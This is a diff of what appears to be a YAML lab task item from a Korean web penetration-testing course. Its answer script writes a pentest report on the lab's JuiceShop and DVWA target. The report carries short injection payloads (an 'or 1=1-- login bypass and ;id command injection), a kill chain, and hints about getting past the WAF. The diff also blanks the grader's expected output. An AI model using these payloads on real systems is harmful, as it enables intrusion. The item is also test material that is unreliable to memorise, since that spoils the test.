+  answer: "cat > /tmp/pentest_report.txt << 'EOF'\n====================================================\n  웹 애플리케이션 침투 테스트 보고서\n  대상: 10.20.30.80 (JuiceShop + DVWA + Apache)\n  수행일: 2026-04-06\n====================================================\n\n[1. 정보수집]\n- 오픈 포트: 80(Apache+ModSecurity), 3000(JuiceShop/Node.js), 8080(DVWA/PHP)\n- 기술스택: Node.js/Express/Angular, PHP/Apache, SQLite\n\n[2. 발견 취약점 -\
+    \ OWASP Top 10 매핑]\n\nCRITICAL (CVSS 9.0+):\n  C-01: SQL Injection 인증 우회 (A03:Injection)\n    /rest/user/login email='or 1=1-- -> admin 토큰 획득\n  C-02: OS Command Injection (A03:Injection)\n    DVWA exec: ;id -> uid=33(www-data) 확인\n  C-03: UNION SELECT DB 스키마 탈취 (A03:Injection)\n    /rest/products/search?q= -> sqlite_master 전체 추출\n\nHIGH (CVSS 7.0-8.9):\n  H-01: BOLA - 타 사용자 장바구니 접근 (A01:Broken\
+    \ Access Control)\n  H-02: 과도한 데이터 노출 - 패스워드 해시 (A01)\n  H-03: Mass Assignment - role/isAdmin 주입 (A01)\n  H-04: Null Byte Injection 파일 다운로드 우회 (A01)\n  H-05: 디렉터리 리스팅 /ftp/ 민감 파일 노출 (A05)\n\nMEDIUM (CVSS 4.0-6.9):\n  M-01: Rate Limiting 부재 (A07:Auth Failures)\n  M-02: 쿠키 보안 속성 미설정 (A07)\n  M-03: CORS 설정 오류 (A05:Misconfiguration)\n  M-04: 서버 배너 정보 노출 (A05)\n\n[3. Kill Chain 시연]\n  SQLi -> Admin Token\
+    \ -> BOLA(User Data) -> CMDi(Server Access)\n  개별 Medium 취약점들이 연결되어 Critical 영향 발생\n\n[4. 방어 현황]\n  ModSecurity CRS: SQLi/XSS/CMDi/LFI 기본 차단 정상\n  우회 가능성: HPP, 일부 인코딩 기법에서 부분 우회\n\n[5. 조치 우선순위]\n  1순위: Prepared Statement 적용 (C-01, C-03)\n  2순위: shell_exec() 제거 + 입력 화이트리스트 (C-02)\n  3순위: RBAC + 객체 소유권 검증 (H-01~H-03)\n  4순위: 디렉터리 리스팅 비활성 + 파일 접근 제한 (H-05)\n  5순위: Rate Limiting + MFA + 쿠키 보안 (M-01~M-02)\n\
+    ====================================================\nEOF\ncat /tmp/pentest_report.txt"
   answer_detail: 전문 침투 테스트 보고서는 경영진 요약(Executive Summary), 취약점 상세(Finding Details), 재현 단계(Reproduction Steps), 권고 사항(Recommendations)으로 구성됩니다. CVSS 점수로 객관적 위험도를 평가하고 OWASP Top 10에 매핑하여 업계 표준을 따릅니다.
   verify:
     type: output_contains
-    expect: 침투 테스트 보고서
+    expect: 
     field: stdout
   target_vm: attacker
-  script: "cat > /tmp/pentest_report.txt << 'EOF'\n====================================================\n  웹 애플리케이션 침투 테스트 보고서\n  대상: 10.20.30.80 (JuiceShop + DVWA + Apache)\n  수행일: 2026-04-06\n====================================================\n\
-    \n[1. 정보수집]\n- 오픈 포트: 80(Apache+ModSecurity), 3000(JuiceShop/Node.js), 8080(DVWA/PHP)\n- 기술스택: Node.js/Express/Angular, PHP/Apache, SQLite\n\n[2. 발견 취약점 - OWASP Top 10 매핑]\n\nCRITICAL (CVSS 9.0+):\n\
-    \  C-01: SQL Injection 인증 우회 (A03:Injection)\n    /rest/user/login email='or 1=1-- -> admin 토큰 획득\n  C-02: OS Command Injection (A03:Injection)\n    DVWA exec: ;id -> uid=33(www-data) 확인\n  C-03: UNION\
-    \ SELECT DB 스키마 탈취 (A03:Injection)\n    /rest/products/search?q= -> sqlite_master 전체 추출\n\nHIGH (CVSS 7.0-8.9):\n  H-01: BOLA - 타 사용자 장바구니 접근 (A01:Broken Access Control)\n  H-02: 과도한 데이터 노출 - 패스워드 해시\
-    \ (A01)\n  H-03: Mass Assignment - role/isAdmin 주입 (A01)\n  H-04: Null Byte Injection 파일 다운로드 우회 (A01)\n  H-05: 디렉터리 리스팅 /ftp/ 민감 파일 노출 (A05)\n\nMEDIUM (CVSS 4.0-6.9):\n  M-01: Rate Limiting 부재 (A07:Auth\
-    \ Failures)\n  M-02: 쿠키 보안 속성 미설정 (A07)\n  M-03: CORS 설정 오류 (A05:Misconfiguration)\n  M-04: 서버 배너 정보 노출 (A05)\n\n[3. Kill Chain 시연]\n  SQLi -> Admin Token -> BOLA(User Data) -> CMDi(Server Access)\n\
-    \  개별 Medium 취약점들이 연결되어 Critical 영향 발생\n\n[4. 방어 현황]\n  ModSecurity CRS: SQLi/XSS/CMDi/LFI 기본 차단 정상\n  우회 가능성: HPP, 일부 인코딩 기법에서 부분 우회\n\n[5. 조치 우선순위]\n  1순위: Prepared Statement 적용 (C-01, C-03)\n  2순위:\
-    \ shell_exec() 제거 + 입력 화이트리스트 (C-02)\n  3순위: RBAC + 객체 소유권 검증 (H-01~H-03)\n  4순위: 디렉터리 리스팅 비활성 + 파일 접근 제한 (H-05)\n  5순위: Rate Limiting + MFA + 쿠키 보안 (M-01~M-02)\n====================================================\n\
-    EOF\ncat /tmp/pentest_report.txt"
+  script: "cat > /tmp/pentest_report.txt << 'EOF'\n====================================================\n  웹 애플리케이션 침투 테스트 보고서\n  대상: 10.20.30.80 (JuiceShop + DVWA + Apache)\n  수행일: 2026-04-06\n====================================================\n\n[1. 정보수집]\n- 오픈 포트: 80(Apache+ModSecurity), 3000(JuiceShop/Node.js), 8080(DVWA/PHP)\n- 기술스택: Node.js/Express/Angular, PHP/Apache, SQLite\n\n[2. 발견 취약점 -\
+    \ OWASP Top 10 매핑]\n\nCRITICAL (CVSS 9.0+):\n  C-01: SQL Injection 인증 우회 (A03:Injection)\n    /rest/user/login email='or 1=1-- -> admin 토큰 획득\n  C-02: OS Command Injection (A03:Injection)\n    DVWA exec: ;id -> uid=33(www-data) 확인\n  C-03: UNION SELECT DB 스키마 탈취 (A03:Injection)\n    /rest/products/search?q= -> sqlite_master 전체 추출\n\nHIGH (CVSS 7.0-8.9):\n  H-01: BOLA - 타 사용자 장바구니 접근 (A01:Broken\
+    \ Access Control)\n  H-02: 과도한 데이터 노출 - 패스워드 해시 (A01)\n  H-03: Mass Assignment - role/isAdmin 주입 (A01)\n  H-04: Null Byte Injection 파일 다운로드 우회 (A01)\n  H-05: 디렉터리 리스팅 /ftp/ 민감 파일 노출 (A05)\n\nMEDIUM (CVSS 4.0-6.9):\n  M-01: Rate Limiting 부재 (A07:Auth Failures)\n  M-02: 쿠키 보안 속성 미설정 (A07)\n  M-03: CORS 설정 오류 (A05:Misconfiguration)\n  M-04: 서버 배너 정보 노출 (A05)\n\n[3. Kill Chain 시연]\n  SQLi -> Admin Token\
+    \ -> BOLA(User Data) -> CMDi(Server Access)\n  개별 Medium 취약점들이 연결되어 Critical 영향 발생\n\n[4. 방어 현황]\n  ModSecurity CRS: SQLi/XSS/CMDi/LFI 기본 차단 정상\n  우회 가능성: HPP, 일부 인코딩 기법에서 부분 우회\n\n[5. 조치 우선순위]\n  1순위: Prepared Statement 적용 (C-01, C-03)\n  2순위: shell_exec() 제거 + 입력 화이트리스트 (C-02)\n  3순위: RBAC + 객체 소유권 검증 (H-01~H-03)\n  4순위: 디렉터리 리스팅 비활성 + 파일 접근 제한 (H-05)\n  5순위: Rate Limiting + MFA + 쿠키 보안 (M-01~M-02)\n\
+    ====================================================\nEOF\ncat /tmp/pentest_report.txt"
   risk_level: low
+  bastion_prompt: 전체 침투 테스트 결과를 요약하는 보안 진단 보고서를 구현 방법을 설명하고 예시 코드를 보여줘
